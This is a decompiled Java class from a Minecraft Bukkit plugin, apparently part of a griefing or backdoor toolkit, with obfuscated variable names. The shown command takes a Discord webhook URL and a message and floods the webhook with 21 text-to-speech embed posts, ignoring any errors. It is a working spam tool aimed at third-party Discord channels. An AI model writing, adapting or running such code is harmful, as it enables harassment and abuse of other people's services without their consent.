/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import com.github.gist.DiscordWebhook;
import java.awt.Color;
import java.io.IOException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SpamwebhookCommand
extends Command {
    public SpamwebhookCommand() {
        SpamwebhookCommand llllllllllllllIlIIIIllllllllllII;
    }

    @Override
    public void execute(Core llllllllllllllIlIIIIllllllllIIII, String llllllllllllllIlIIIIlllllllIllll, String[] llllllllllllllIlIIIIlllllllIllII, Player llllllllllllllIlIIIIlllllllIlIll) {
        if (llllllllllllllIlIIIIlllllllIllII.length <= 2) {
            llllllllllllllIlIIIIlllllllIlIll.sendMessage(Settings.USAGE("spamWebhook <url> <message>"));
        } else {
            StringBuilder llllllllllllllIlIIIIllllllllIIlI = new StringBuilder();
            for (int llllllllllllllIlIIIIllllllllIlIl = 2; llllllllllllllIlIIIIllllllllIlIl != llllllllllllllIlIIIIlllllllIllII.length; ++llllllllllllllIlIIIIllllllllIlIl) {
                llllllllllllllIlIIIIllllllllIIlI.append(llllllllllllllIlIIIIlllllllIllII[llllllllllllllIlIIIIllllllllIlIl]).append(" ");
            }
            for (int llllllllllllllIlIIIIllllllllIIll = 0; llllllllllllllIlIIIIllllllllIIll <= 20; ++llllllllllllllIlIIIIllllllllIIll) {
                DiscordWebhook llllllllllllllIlIIIIllllllllIlII = new DiscordWebhook(llllllllllllllIlIIIIlllllllIllII[1]);
                llllllllllllllIlIIIIllllllllIlII.setTts(true);
                llllllllllllllIlIIIIllllllllIlII.addEmbed(new DiscordWebhook.EmbedObject().setTitle(":laughing: :slight_smile: :mask: :heart_eyes:").setColor(Color.orange).setDescription(String.valueOf(llllllllllllllIlIIIIllllllllIIlI)));
                try {
                    llllllllllllllIlIIIIllllllllIlII.execute();
                    continue;
                }
                catch (IOException llllllllllllllIlIIIIlllllllIIlll) {
                    // empty catch block
                }
            }
            llllllllllllllIlIIIIlllllllIlIll.sendMessage(Settings.PREFIX("Spammed the message 20 times!"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

